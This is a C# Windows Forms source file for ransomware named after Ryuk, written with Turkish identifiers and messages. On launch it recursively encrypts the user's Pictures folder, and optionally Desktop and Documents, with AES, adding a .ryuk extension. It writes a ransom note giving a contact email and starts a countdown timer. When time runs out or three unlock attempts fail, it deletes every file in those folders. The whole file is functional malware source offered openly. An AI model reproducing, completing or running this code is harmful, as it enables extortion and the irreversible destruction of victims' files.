using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Drawing.Text;
using System.Xml;

namespace Ryuk_Ransomware
{
    public partial class RyukEncrypter : Form
    {
        //-------------- RANSOMWARE AYARLARI --------------//
        private const bool ORIJINAL_DOSYALARI_SIL = false;
        private const bool MASAUSTU_SIFRELE = false;
        private const bool DOKUMANLARI_SIFRELE = false;
        private const bool FOTOGRAFLARI_SIFRELE = true;
        private const string SIFRELENMIS_DOSYA_UZANTISI = ".ryuk";
        private const string ENCRYPT_SIFRESI = "Password1";
        private const string EMAIL_ADRESI = "this.email.address@gmail.com";
        private const bool SIFRELENMIS_DOSYALARI_SIL = true;
        private int kalanZaman = 120; //saniye cinsinden kalan zaman
        private const string BUTON_SIFRESI = "ryukransom";
        int butonSifreDenemeHakki = 3;

        //--------------------  BİTTİ --------------------//

        private static string SIFRELEME_LOG = "";
        private string RANSOM_MESAJ =
            "Bütün dosyalarının şifrelendi. \n\n" +
            "Dosyalarını kurtarmak için mail atman gereken adres: " + EMAIL_ADRESI + "\n\n" +
            "İyi Günler Dilerim :) \n\n"+
            "Ölüm defterine ismi yazılan dosyalar: \n\n" +
            "----------------------------------------\n";
        private static string MASAUSTU_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); //Masaüstü konumunun bilgisini alır.
        private static string DOKUMANLAR_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);   //Dokümanlar konumunun bilgisini alır.
        private static string FOTOGRAFLAR_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);   //Fotoğraflar konumunun bilgisini alır.
        private static int sifrelenmisDosyaSayaci = 0;

        private static string SİFRECOZME_LOG = "";
        private static int cozulenDosyaSayaci = 0;

        public RyukEncrypter()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            if(MASAUSTU_SIFRELE)
            {
                sifrelenecekKlasorIcerikleri(MASAUSTU_KLASORU);
            }

            if (DOKUMANLARI_SIFRELE)
            {
                sifrelenecekKlasorIcerikleri(DOKUMANLAR_KLASORU);
            }

            if (FOTOGRAFLARI_SIFRELE)
            {
                sifrelenecekKlasorIcerikleri(FOTOGRAFLAR_KLASORU);
            }

            if (sifrelenmisDosyaSayaci > 0)
            {
                sifrelemeSonrasiForm();
                ransomMesajiGoster();
            }

            else
            {
                MessageBox.Show("Şifrelenecek Dosya Bulunamadı");
                Application.Exit();
            }
            
        }

        private void ransomMesajiGoster()
        {
            StreamWriter ransomWriter = new StreamWriter(MASAUSTU_KLASORU + @"\____KURTARMA__DOSYASI__" + SIFRELENMIS_DOSYA_UZANTISI + ".txt");
            ransomWriter.WriteLine(RANSOM_MESAJ);
            ransomWriter.WriteLine(SIFRELEME_LOG);
            ransomWriter.Close();
        }

        private void sifrelemeSonrasiForm()
        {
            timer1.Enabled = true;
            UpdateTextBox();
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            label3.Text = "Kalan Deneme Hakkı: " + butonSifreDenemeHakki;
            label2.Text = sifrelenmisDosyaSayaci +" adet dosyan şifrelendi !";

        }
        static void sifrelenecekKlasorIcerikleri(string sDir)
        {
            try
            {
                foreach(string d in Directory.GetFiles(sDir))
                {
                    if(!d.Contains(SIFRELENMIS_DOSYA_UZANTISI))
                    {
                        Console.Out.WriteLine("Şifreleniyor: " + d);
                        if(!(d == "Ryuk Ransomware"))
                        {
                            DosyaSifrele(d, ENCRYPT_SIFRESI);
                        }
                    }
                }

                foreach(string k in Directory.GetDirectories(sDir))
                {
                    sifrelenecekKlasorIcerikleri(k);
                }
            }
            catch(System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void DosyaSifrele(string inputDosya, string sifre)
        {
            //AES SİFRELEMESİ KULLANACAĞIM

            //random salt oluşturma
            byte[] salt = RandomSaltOlustur();

            //Dosyanı çıkış ismini yarat
            FileStream fsCrypt = new FileStream(inputDosya + SIFRELENMIS_DOSYA_UZANTISI, FileMode.Create);

            //Şifreyi Byte'lara çevirme
            byte[] sifreByte = System.Text.Encoding.UTF8.GetBytes(sifre);

            //Rijndael simetrik şifrelemenin kurulması
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(sifreByte, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CBC;

            //oluşturulan salt değerini salt'ı dosyanın başına yazıyoruz.
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputDosya, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
            }

            catch(Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                SIFRELEME_LOG += inputDosya + "\n";
                sifrelenmisDosyaSayaci++;
                cs.Close();
                fsCrypt.Close();
                fsIn.Close();
               
                if (ORIJINAL_DOSYALARI_SIL)
                {
                    try
                    {
                        File.Delete(inputDosya);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("HATA: " + ex.Message);

                    }

                }
            }
        }

        public static byte[] RandomSaltOlustur()
        {
            byte[] data = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for(int i= 0; i<10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        private static void DosyaSifreCoz(string inputDosya, string outputDosya, string sifre)
        {
            byte[] sifreBytes = System.Text.Encoding.UTF8.GetBytes(sifre);
            byte[] salt = new byte[32];

            FileStream cryptoFileStream = new FileStream(inputDosya, FileMode.Open);
            cryptoFileStream.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(sifreBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputDosya, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];
            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException hata: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(" CryptoStream Kapatma Hatası: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                cryptoFileStream.Close();
                cryptoStream.Close();
                if(SIFRELENMIS_DOSYALARI_SIL)
                {
                  File.Delete(inputDosya);
                }
                SİFRECOZME_LOG += inputDosya + "\n";
                cozulenDosyaSayaci++;
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            if (MASAUSTU_SIFRELE)
            {
                sifresiCozulecekKlasorIcerikleri(MASAUSTU_KLASORU);
            }

            if (DOKUMANLARI_SIFRELE)
            {
                sifresiCozulecekKlasorIcerikleri(DOKUMANLAR_KLASORU);
            }

            if (FOTOGRAFLARI_SIFRELE)
            {
                sifresiCozulecekKlasorIcerikleri(FOTOGRAFLAR_KLASORU);
            }
            

            if (cozulenDosyaSayaci > 0)
            {
                sifreCozmeLogGoster();
                MessageBox.Show("ŞİFRELEME ÇÖZÜLDÜ");
                sifreCozmeSonrasiForm();
            }
            else
            {
                Console.Out.WriteLine("No files to encrypt.");
            }
        }

        static void sifresiCozulecekKlasorIcerikleri(string sDİR)
        {
            try
            {
                foreach(string dosya in Directory.GetFiles(sDİR))
                    if(dosyaSifreliMi(dosya))
                    {
                        DosyaSifreCoz(dosya, dosya.Substring(0, dosya.Length - SIFRELENMIS_DOSYA_UZANTISI.Length), ENCRYPT_SIFRESI);
                    }
                foreach(string klasor in Directory.GetDirectories(sDİR))
                {
                    sifresiCozulecekKlasorIcerikleri(klasor);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static bool dosyaSifreliMi(string inputDosya)
        {
            if (inputDosya.Contains(SIFRELENMIS_DOSYA_UZANTISI))
                if (inputDosya.Substring(inputDosya.Length - SIFRELENMIS_DOSYA_UZANTISI.Length, SIFRELENMIS_DOSYA_UZANTISI.Length) == SIFRELENMIS_DOSYA_UZANTISI)
                    return true;

            return false;
        }
        
        private static void sifreCozmeLogGoster()
        {
            StreamWriter ransomWriter = new StreamWriter(MASAUSTU_KLASORU + @"\___DECRYPTION_LOG.txt");
            ransomWriter.WriteLine(cozulenDosyaSayaci + " dosya şifresi çözüldü." +
                "\n----------------------------------------\n" +
                SİFRECOZME_LOG);
            ransomWriter.Close();
        }

        private void sifreCozmeSonrasiForm()
        {
            Application.Exit();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            label3.Text = "Kalan Deneme Hakkı: " + butonSifreDenemeHakki;
            if (butonSifreDenemeHakki > 0)
            {
                if (textBox3.Text == BUTON_SIFRESI)
                {
                    timer1.Enabled = false;
                    button1.Enabled = true;
                    button2.Enabled = false;
                }
                else
                {
                    butonSifreDenemeHakki--;
                }
            }
            else if(butonSifreDenemeHakki == 0)
            {
                dosyaOldurme();
                timer1.Enabled = false;
                MessageBox.Show("DENEME HAKKINIZ DOLDU ! BÜTÜN DOSYALAR SİLİNDİ");
                Application.Exit();
            }
            
            
        }
        private void UpdateTextBox()
        {
            int saat = kalanZaman / 3600;
            int dakika = (kalanZaman % 3600) / 60;
            int saniye = kalanZaman % 60;
            textBox1.Text = $"{saat:D2}:{dakika:D2}:{saniye:D2}";
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (kalanZaman > 0)
            {
                kalanZaman--; // Kalan zamanı bir azalt
                UpdateTextBox(); // TextBox'ı güncelle
            }

            if(kalanZaman == 0)
            {
                timer1.Enabled=false;
                MessageBox.Show("VAKİT DOLDU");
                dosyaOldurme();
                Application.Exit();
            }
        }

        private static void dosyaOldurme()
        {
            if (MASAUSTU_SIFRELE)
            {
                oldurulecekKlasorler(MASAUSTU_KLASORU);
            }

            if (DOKUMANLARI_SIFRELE)
            {
                oldurulecekKlasorler(DOKUMANLAR_KLASORU);
            }

            if (FOTOGRAFLARI_SIFRELE)
            {
                oldurulecekKlasorler(FOTOGRAFLAR_KLASORU);
            }

        }

        static void oldurulecekKlasorler(string sDİR)
        {
            try
            {
                foreach (string dosya in Directory.GetFiles(sDİR))
                {
                  File.Delete(dosya);
                }
                foreach (string klasor in Directory.GetDirectories(sDİR))
                {
                    oldurulecekKlasorler(klasor);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
